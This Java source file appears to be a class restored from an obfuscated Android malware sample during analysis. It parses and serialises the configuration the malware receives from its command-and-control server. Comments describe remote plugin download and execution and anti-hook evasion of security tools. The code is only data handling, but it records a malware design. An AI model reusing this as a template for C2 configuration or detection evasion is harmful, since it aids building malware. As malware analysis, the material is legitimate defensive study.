package c2;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: c13.nim5.ez8.h5_proto.DllpgdConfig
 *
 * Configuration payload received from the C&C server's /api/v1/dllpgd/getConfig endpoint.
 * Controls the malware's runtime behavior including:
 *
 * - plugins: list of remote plugin definitions to download and execute
 * - sessionId: server-assigned session identifier
 * - hookPkgNameStackTraces: stack trace patterns for package name hook detection
 * - hookPackageManagerStackTraces: stack trace patterns for PackageManager hook detection
 * - fixPackageName: replacement package name to use when hooks are detected
 *
 * The hook-related fields enable anti-analysis / anti-detection: the malware
 * checks if certain system calls have been hooked (e.g., by security tools)
 * by comparing stack traces, and applies countermeasures (fixPackageName).
 */
public class DllpgdConfig {
    private List<PluginInfo> plugins;
    private String sessionId;
    private List<String> hookPkgNameStackTraces;
    private List<String> hookPackageManagerStackTraces;
    private String fixPackageName;

    public DllpgdConfig() {
        this.plugins = new ArrayList<>();
        this.sessionId = "";
        this.hookPkgNameStackTraces = new ArrayList<>();
        this.hookPackageManagerStackTraces = new ArrayList<>();
        this.fixPackageName = "";
    }

    public static DllpgdConfig fromJSONObject(JSONObject json) throws JSONException {
        DllpgdConfig config = new DllpgdConfig();

        // Parse plugin list
        if (json.has("plugins") && !json.isNull("plugins")) {
            JSONArray jsonArray = json.getJSONArray("plugins");
            config.plugins = new ArrayList<>();
            for (int i = 0; i < jsonArray.length(); i++) {
                config.plugins.add(PluginInfo.fromJSONObject(jsonArray.getJSONObject(i)));
            }
        }

        // Parse session ID
        if (json.has("sessionId") && !json.isNull("sessionId")) {
            config.sessionId = json.getString("sessionId");
        }

        // Parse package name hook detection stack traces
        if (json.has("hookPkgNameStackTraces") && !json.isNull("hookPkgNameStackTraces")) {
            JSONArray jsonArray2 = json.getJSONArray("hookPkgNameStackTraces");
            config.hookPkgNameStackTraces = new ArrayList<>();
            for (int i = 0; i < jsonArray2.length(); i++) {
                config.hookPkgNameStackTraces.add(jsonArray2.getString(i));
            }
        }

        // Parse PackageManager hook detection stack traces
        if (json.has("hookPackageManagerStackTraces") && !json.isNull("hookPackageManagerStackTraces")) {
            JSONArray jsonArray3 = json.getJSONArray("hookPackageManagerStackTraces");
            config.hookPackageManagerStackTraces = new ArrayList<>();
            for (int i = 0; i < jsonArray3.length(); i++) {
                config.hookPackageManagerStackTraces.add(jsonArray3.getString(i));
            }
        }

        // Parse fix package name (anti-hook countermeasure)
        if (json.has("fixPackageName") && !json.isNull("fixPackageName")) {
            config.fixPackageName = json.getString("fixPackageName");
        }

        return config;
    }

    // Getters
    public String getFixPackageName() { return this.fixPackageName; }
    public List<String> getHookPackageManagerStackTraces() { return this.hookPackageManagerStackTraces; }
    public List<String> getHookPkgNameStackTraces() { return this.hookPkgNameStackTraces; }
    public List<PluginInfo> getPlugins() { return this.plugins; }
    public String getSessionId() { return this.sessionId; }

    // Setters
    public void setFixPackageName(String str) { this.fixPackageName = str; }
    public void setHookPackageManagerStackTraces(List<String> list) { this.hookPackageManagerStackTraces = list; }
    public void setHookPkgNameStackTraces(List<String> list) { this.hookPkgNameStackTraces = list; }
    public void setPlugins(List<PluginInfo> list) { this.plugins = list; }
    public void setSessionId(String str) { this.sessionId = str; }

    public JSONObject toJSONObject() throws JSONException {
        JSONObject json = new JSONObject();

        if (this.plugins != null) {
            JSONArray jsonArray = new JSONArray();
            for (PluginInfo pluginInfo : this.plugins) {
                jsonArray.put(pluginInfo.toJSONObject());
            }
            json.put("plugins", jsonArray);
        }

        json.put("sessionId", this.sessionId);

        if (this.hookPkgNameStackTraces != null) {
            JSONArray jsonArray2 = new JSONArray();
            for (String trace : this.hookPkgNameStackTraces) {
                jsonArray2.put(trace);
            }
            json.put("hookPkgNameStackTraces", jsonArray2);
        }

        if (this.hookPackageManagerStackTraces != null) {
            JSONArray jsonArray3 = new JSONArray();
            for (String trace : this.hookPackageManagerStackTraces) {
                jsonArray3.put(trace);
            }
            json.put("hookPackageManagerStackTraces", jsonArray3);
        }

        json.put("fixPackageName", this.fixPackageName);
        return json;
    }

    @Override
    public String toString() {
        return "DllpgdConfig{plugins=" + this.plugins
                + ", sessionId=" + this.sessionId
                + ", hookPkgNameStackTraces=" + this.hookPkgNameStackTraces
                + ", hookPackageManagerStackTraces=" + this.hookPackageManagerStackTraces
                + ", fixPackageName=" + this.fixPackageName + "}";
    }
}
